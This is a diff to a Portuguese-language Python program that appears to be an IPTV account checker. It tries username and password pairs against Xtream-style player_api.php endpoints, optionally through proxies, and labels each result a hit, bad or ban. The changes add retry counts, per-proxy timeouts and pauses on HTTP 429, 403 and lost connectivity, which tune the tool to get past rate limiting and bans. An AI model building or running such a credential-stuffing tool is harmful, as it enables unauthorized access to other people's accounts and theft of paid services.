@@ -141,7 +141,17 @@ def carregar_configuracoes():
             "MESSAGE": True,
             "M3U_LINK": True
         },
-        "request_timeout": 10 # Novo campo padrão para timeout de requisição
+        "request_timeout": 10,
+        "tentativas_sem_proxy": 2,
+        "tentativas_com_proxy": 3,
+        "timeout_sem_proxy": 10,
+        "timeout_com_proxy": 15,
+        "pausar_queda_internet": False,
+        "pausar_429": {
+            "ativo": False,
+            "tempo": 60
+        },
+        "pausar_403": True
     }
     
     if os.path.exists(CONFIG_FILE):
@@ -149,30 +159,45 @@ def carregar_configuracoes():
             with open(CONFIG_FILE, "r") as f:
                 dados = json.load(f)
                 
-                # Corrige estrutura aninhada legada (para compatibilidade com versões antigas)
                 if isinstance(dados.get("sistema_operacional"), dict):
                     config = {
                         "sistema_operacional": dados["sistema_operacional"].get("sistema_operacional"),
                         "idioma": dados["sistema_operacional"].get("idioma", "pt"),
                         "configurado": dados["sistema_operacional"].get("configurado", False),
-                        "banner_color": dados.get("banner_color", "90m"),  # Novo campo
+                        "banner_color": dados.get("banner_color", "90m"),
                         "hit_settings": {**defaults["hit_settings"], **dados.get("hit_settings", {})},
-                        "request_timeout": dados.get("request_timeout", defaults["request_timeout"])
+                        "request_timeout": dados.get("request_timeout", defaults["request_timeout"]),
+                        "tentativas_sem_proxy": dados.get("tentativas_sem_proxy", defaults["tentativas_sem_proxy"]),
+                        "tentativas_com_proxy": dados.get("tentativas_com_proxy", defaults["tentativas_com_proxy"]),
+                        "timeout_sem_proxy": dados.get("timeout_sem_proxy", defaults["timeout_sem_proxy"]),
+                        "timeout_com_proxy": dados.get("timeout_com_proxy", defaults["timeout_com_proxy"]),
+                        "pausar_queda_internet": dados.get("pausar_queda_internet", defaults["pausar_queda_internet"]),
+                        "pausar_429": dados.get("pausar_429", defaults["pausar_429"]),
+                        "pausar_403": dados.get("pausar_403", defaults["pausar_403"])
                     }
                 else:
-                    # Mescla com defaults mantendo configurações existentes
                     config = {**defaults, **dados}
-                
-                # Garante que hit_settings tenha todas as chaves (para versões antigas sem essas configurações)
+
                 config["hit_settings"] = {**defaults["hit_settings"], **dados.get("hit_settings", {})}
-                
-                # Garante que o banner_color esteja definido (para versões antigas)
+
                 if "banner_color" not in config:
                     config["banner_color"] = "90m"
-                
-                # Garante que o request_timeout esteja definido
                 if "request_timeout" not in config:
                     config["request_timeout"] = defaults["request_timeout"]
+                if "tentativas_sem_proxy" not in config:
+                    config["tentativas_sem_proxy"] = defaults["tentativas_sem_proxy"]
+                if "tentativas_com_proxy" not in config:
+                    config["tentativas_com_proxy"] = defaults["tentativas_com_proxy"]
+                if "timeout_sem_proxy" not in config:
+                    config["timeout_sem_proxy"] = defaults["timeout_sem_proxy"]
+                if "timeout_com_proxy" not in config:
+                    config["timeout_com_proxy"] = defaults["timeout_com_proxy"]
+                if "pausar_queda_internet" not in config:
+                    config["pausar_queda_internet"] = defaults["pausar_queda_internet"]
+                if "pausar_429" not in config:
+                    config["pausar_429"] = defaults["pausar_429"]
+                if "pausar_403" not in config:
+                    config["pausar_403"] = defaults["pausar_403"]
 
                 return config
         except Exception as e:
@@ -190,7 +215,14 @@ def salvar_configuracao(config):
         "categoria_tipo": config.get("categoria_tipo", "empilhado"),
         "banner_color": config.get("banner_color", "90m"),
         "hit_settings": config.get("hit_settings", {}),
-        "request_timeout": config.get("request_timeout", 10)
+        "request_timeout": config.get("request_timeout", 10),
+        "tentativas_sem_proxy": config.get("tentativas_sem_proxy", 2),
+        "tentativas_com_proxy": config.get("tentativas_com_proxy", 3),
+        "timeout_sem_proxy": config.get("timeout_sem_proxy", 10),
+        "timeout_com_proxy": config.get("timeout_com_proxy", 15),
+        "pausar_queda_internet": config.get("pausar_queda_internet", False),
+        "pausar_429": config.get("pausar_429", {"ativo": False, "tempo": 60}),
+        "pausar_403": config.get("pausar_403", True)
     }
     with open(CONFIG_FILE, "w") as f:
         json.dump(config_plana, f, indent=4)
@@ -524,111 +556,125 @@ def converter_data(timestamp, t=None):
     except:
         return t('checker.unlimited_time') if t else "Ilimitada"
 
-# Função para testar usuário e senha (com ou sem proxy)
 def test_account(username, password, proxy_config, server, headers, t, buscar_categorias_flag=False, config=None):
     """
     Retorna uma tupla no formato:
     (tipo_resultado, username, password, status, exp_date, status_code, user_info)
 
     - tipo_resultado: "hit", "bad", "ban", "timeout", "proxy_error"
-    - username: str (input)
-    - password: str (input)
-    - status: str (ativo/expirado/etc)
-    - exp_date: str (data formatada ou "Ilimitada")
-    - status_code: int (código HTTP ou string de erro)
-    - user_info: dict (dados adicionais da conta)
     """
     url = f"http://{server}/player_api.php?username={username}&password={password}"
-    try:
-        response = requests.get(
-            url,
-            proxies=proxy_config,
-            headers=headers,
-            timeout=config.get("request_timeout", 10)
-        )
-        if response.status_code == 200:
-            try:
-                data = response.json()
-                auth = data.get("user_info", {}).get("auth", 0)
-                if auth == 0: auth = data.get("auth", 0)
+    tentativas = config.get("tentativas_com_proxy", 3) if proxy_config else config.get("tentativas_sem_proxy", 2)
+    timeout = config.get("timeout_com_proxy", 15) if proxy_config else config.get("timeout_sem_proxy", 10)
+    proxies = proxy_config if proxy_config else None
 
-                if auth == 1:
-                    user_info = data.get("user_info", {})
-                    status = user_info.get("status", data.get("status", "Desconhecido"))
-                    exp_date = user_info.get("exp_date", data.get("exp_date"))
-                    exp_date = t("checker.unlimited_time") if exp_date is None else converter_data(exp_date, t)
-                    if buscar_categorias_flag:
-                        user_info["categorias"] = buscar_categorias(server, username, password, proxy_config, headers, config)
-                    
-                    return (
-                        "hit", 
-                        username, 
-                        password, 
-                        status, 
-                        exp_date, 
-                        response.status_code, 
-                        user_info
-                    )
-                else:
+    for tentativa in range(tentativas):
+        try:
+            response = requests.get(url, proxies=proxies, headers=headers, timeout=timeout)
 
+            # Status 429 → pausa se ativado
+            if response.status_code == 429:
+                if config.get("pausar_429", {}).get("ativo"):
+                    tempo = config.get("pausar_429", {}).get("tempo", 60)
+                    print(f"{cor.amarelo}[429] Pausando por {tempo} segundos...{cor.reset}")
+                    time.sleep(tempo)
+                return "ban", username, password, None, None, response.status_code, None
+
+            # Status 403 ou 407 → ban
+            if response.status_code in [403, 407]:
+                return "ban", username, password, None, None, response.status_code, None
+
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    auth = data.get("user_info", {}).get("auth", 0)
+                    if auth == 0:
+                        auth = data.get("auth", 0)
+
+                    if auth == 1:
+                        user_info = data.get("user_info", {})
+                        status = user_info.get("status", data.get("status", "Desconhecido"))
+                        exp_date = user_info.get("exp_date", data.get("exp_date"))
+                        exp_date = t("checker.unlimited_time") if exp_date is None else converter_data(exp_date, t)
+
+                        if buscar_categorias_flag:
+                            user_info["categorias"] = buscar_categorias(
+                                server, username, password, proxy_config, headers, config
+                            )
+
+                        return (
+                            "hit",
+                            username,
+                            password,
+                            status,
+                            exp_date,
+                            response.status_code,
+                            user_info
+                        )
+                    else:
+                        return (
+                            "bad",
+                            username,
+                            password,
+                            None,
+                            None,
+                            response.status_code,
+                            None
+                        )
+                except (ValueError, json.JSONDecodeError):
                     return (
-                        "bad",  # ou "ban", "timeout", etc.
+                        "bad",
                         username,
                         password,
-                        None,  # status (não disponível)
-                        None,  # exp_date (não disponível)
-                        response.status_code,  # ou "TIMED OUT", "Proxy Error", etc.
-                        None   # user_info (não disponível)
+                        None,
+                        None,
+                        response.status_code,
+                        None
                     )
-            except (ValueError, json.JSONDecodeError):
-                return (
-                    "bad",
-                    username,
-                    password,
-                    None,
-                    None,
-                    response.status_code,
-                    None
-                 )
-        elif response.status_code in [403, 407]:
-            return "ban", username, password, None, None, response.status_code, None
-        else: # 404 e outros erros
-            return (
-                "bad",
-                username,
-                password,
-                None,
-                None,
-                response.status_code,
-                None
-            )
 
-    except requests.exceptions.Timeout:
-        return "timeout", username, password, None, None, "TIMED OUT", None
-    
-    except requests.exceptions.ProxyError as e:
-        print(f"{cor.vermelho}[DEBUG PROXY ERROR] {e}{cor.reset}") # Adicionado para depuração
-        return "proxy_error", username, password, None, None, "Proxy Error", None
-    
-    except requests.exceptions.ConnectionError as e:
-        print(f"{cor.vermelho}[DEBUG CONNECTION ERROR] {e}{cor.reset}") # Adicionado para depuração
-        return "connection_error", username, password, None, None, "Connection Error", None
-    
-    except requests.exceptions.RequestException:
-        return "proxy_error", username, password, None, None, "Request Error", None
+            # Outros códigos HTTP
+            return "bad", username, password, None, None, response.status_code, None
+
+        except requests.exceptions.Timeout:
+            continue  # tenta novamente
+
+        except requests.exceptions.ProxyError as e:
+            print(f"{cor.vermelho}[DEBUG PROXY ERROR] {e}{cor.reset}")
+            return "proxy_error", username, password, None, None, "Proxy Error", None
+
+        except requests.exceptions.ConnectionError as e:
+            if config.get("pausar_queda_internet", False):
+                print(f"{cor.amarelo}[Sem conexão] Pausando e tentando reconectar...{cor.reset}")
+                while True:
+                    try:
+                        requests.get("http://clients3.google.com/generate_204", timeout=5)
+                        print(f"{cor.verde}[Conexão recuperada!]{cor.reset}")
+                        break
+                    except:
+                        time.sleep(2)
+            else:
+                print(f"{cor.vermelho}[DEBUG CONNECTION ERROR] {e}{cor.reset}")
+                return "connection_error", username, password, None, None, "Connection Error", None
+
+        except requests.exceptions.RequestException:
+            return "proxy_error", username, password, None, None, "Request Error", None
+
+    # Se todas as tentativas forem esgotadas:
+    return "timeout", username, password, None, None, "Max tentativas", None
 
 
-def buscar_categorias(server, username, password, proxy_config, headers, config, max_tentativas=3):
+def buscar_categorias(server, username, password, proxy_config, headers, config):
     """Busca categorias disponíveis para uma conta válida com tentativas"""
     url = f"http://{server}/player_api.php?username={username}&password={password}&action=get_live_categories"
     
+    max_tentativas = config.get("tentativas_com_proxy", 3) if proxy_config else config.get("tentativas_sem_proxy", 2)
     for tentativa in range(max_tentativas):
         try:
             response = requests.get(
                 url,
                 proxies=proxy_config,
                 headers=headers,
-                timeout=config.get("request_timeout", 10)
+                timeout=config.get("timeout_com_proxy", 15) if proxy_config else config.get("timeout_sem_proxy", 10)
             )
             
             if response.status_code == 200:
@@ -1024,17 +1070,18 @@ def mostrar_menu_principal(config, t):
 
 
 def mostrar_menu_configuracoes(config, t):
-    """Menu de configurações com opções de idioma, SO e categorias"""
+    """Menu de configurações com opções de idioma, SO, categorias, banner e requisições"""
     while True:
         banner(config, t)
         print(f"\n{cor.ciano}  === {t('settings_title', 'SETTINGS')} ==={cor.reset}")
         print(f"{cor.azul}  = 1. {t('change_language', 'Change Language')} (Atual: {config['idioma']}){cor.reset}")
-        print(f"{cor.azul}  = 2. {t('change_os', 'Change operating system')} (Atual: {config['sistema_operacional'] or 'Não configurado'}){cor.reset}")
+        print(f"{cor.azul}  = 2. {t('change_os', 'Change operating system')} (Atual: {config.get('sistema_operacional', 'Não configurado')}){cor.reset}")
         print(f"{cor.azul}  = 3. {t('menu.categoria_menu', 'CATEGORY SETTINGS')}{cor.reset}")
         print(f"{cor.azul}  = 4. {t('menu.banner_settings', 'BANNER SETTINGS')}{cor.reset}")
-        print(f"{cor.azul}  = 5. {t("menu.request_timeout_settings", "REQUEST TIMEOUT SETTINGS")} (Atual: {config["request_timeout"]}s){cor.reset}")
-        print(f"{cor.azul}  = 5. {t('save_exit', 'Save and exit')}{cor.reset}")
+        print(f"{cor.azul}  = 5. Configurações de Requisição{cor.reset}")
+        print(f"{cor.azul}  = 6. {t('save_exit', 'Save and exit')}{cor.reset}")
         print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+        
         escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
         
         if escolha == "1":
@@ -1044,44 +1091,14 @@ def mostrar_menu_configuracoes(config, t):
         elif escolha == "3":
             configurar_categoria(config, t)
         elif escolha == "4":
-            configurar_banner(config, t)  # Nova função
+            configurar_banner(config, t)
         elif escolha == "5":
-            configurar_request_timeout(config, t) # Nova função para timeout
+            configurar_requisicoes(config, t)
         elif escolha == "6":
             salvar_configuracao(config)
             break
         else:
-            print(f"{cor.vermelho}{t('invalid_option')}{cor.reset}")
-
-def configurar_request_timeout(config, t):
-    """Menu para configurar o tempo limite das requisições"""
-    while True:
-        banner(config, t)
-        current_timeout = config.get("request_timeout", 10)
-        
-        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DE TEMPO LIMITE DE REQUISIÇÃO ==={cor.reset}")
-        print(f"{cor.azul}  Tempo limite atual: {current_timeout} segundos{cor.reset}")
-        print(f"{cor.azul}  Digite o novo tempo limite em segundos (ou \'v\' para voltar):{cor.reset}\n")
-        
-        escolha = input(f"{cor.verde}  {t("responses.response")} >>> {cor.reset}").strip()
-        
-        if escolha.lower() == "v":
-            break
-        
-        try:
-            novo_timeout = int(escolha)
-            if novo_timeout > 0:
-                config["request_timeout"] = novo_timeout
-                salvar_configuracao(config)
-                print(f"{cor.verde}Tempo limite de requisição salvo: {novo_timeout} segundos!{cor.reset}")
-                time.sleep(1)
-                break
-            else:
-                print(f"{cor.vermelho}O tempo limite deve ser um número positivo!{cor.reset}")
-                time.sleep(1)
-        except ValueError:
-            print(f"{cor.vermelho}Entrada inválida! Digite um número inteiro ou \'v\' para voltar.{cor.reset}")
-            time.sleep(1)
+            print(f"{cor.vermelho}{t('invalid_option', 'Opção inválida!')}{cor.reset}")
 
 
 # Função para configurar o banner:
@@ -1120,6 +1137,57 @@ def configurar_banner(config, t):
             break
         else:
             print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+
+
+def configurar_requisicoes(config, t):
+    """Menu para configurar o comportamento das requisições"""
+    while True:
+        banner(config, t)
+        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DE REQUISIÇÃO ==={cor.reset}")
+        print(f"{cor.azul}  1. Tentativas (sem proxy): {config.get('tentativas_sem_proxy', 2)}{cor.reset}")
+        print(f"{cor.azul}  2. Tentativas (com proxy): {config.get('tentativas_com_proxy', 3)}{cor.reset}")
+        print(f"{cor.azul}  3. Timeout (sem proxy): {config.get('timeout_sem_proxy', 10)}s{cor.reset}")
+        print(f"{cor.azul}  4. Timeout (com proxy): {config.get('timeout_com_proxy', 15)}s{cor.reset}")
+        print(f"{cor.azul}  5. Pausar se cair a internet: {'ON' if config.get('pausar_queda_internet') else 'OFF'}{cor.reset}")
+        print(f"{cor.azul}  6. Pausar ao receber 429: {'ON' if config.get('pausar_429', {}).get('ativo') else 'OFF'} ({config.get('pausar_429', {}).get('tempo', 60)}s){cor.reset}")
+        print(f"{cor.azul}  7. Pausar ao receber 403: {'ON' if config.get('pausar_403') else 'OFF'}{cor.reset}")
+        print(f"{cor.azul}  8. Voltar{cor.reset}")
+        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+
+        escolha = input(f"{cor.verde}>>> {cor.reset}").strip()
+
+        if escolha == "1":
+            novo = input(f"{cor.ciano}Tentativas sem proxy:{cor.reset} ").strip()
+            if novo.isdigit(): config["tentativas_sem_proxy"] = int(novo)
+        elif escolha == "2":
+            novo = input(f"{cor.ciano}Tentativas com proxy:{cor.reset} ").strip()
+            if novo.isdigit(): config["tentativas_com_proxy"] = int(novo)
+        elif escolha == "3":
+            novo = input(f"{cor.ciano}Timeout sem proxy (s):{cor.reset} ").strip()
+            if novo.isdigit(): config["timeout_sem_proxy"] = int(novo)
+        elif escolha == "4":
+            novo = input(f"{cor.ciano}Timeout com proxy (s):{cor.reset} ").strip()
+            if novo.isdigit(): config["timeout_com_proxy"] = int(novo)
+        elif escolha == "5":
+            atual = config.get("pausar_queda_internet", False)
+            config["pausar_queda_internet"] = not atual
+        elif escolha == "6":
+            atual = config.get("pausar_429", {}).get("ativo", False)
+            novo_estado = not atual
+            config["pausar_429"]["ativo"] = novo_estado
+            if novo_estado:
+                tempo = input(f"{cor.ciano}Tempo de pausa ao receber 429 (s):{cor.reset} ").strip()
+                if tempo.isdigit():
+                    config["pausar_429"]["tempo"] = int(tempo)
+        elif escolha == "7":
+            atual = config.get("pausar_403", True)
+            config["pausar_403"] = not atual
+        elif escolha == "8":
+            salvar_configuracao(config)
+            break
+        else:
+            print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+
 
 # Adicionar nova função para selecionar tipo de categoria
 def selecionar_tipo_categoria(config, t):
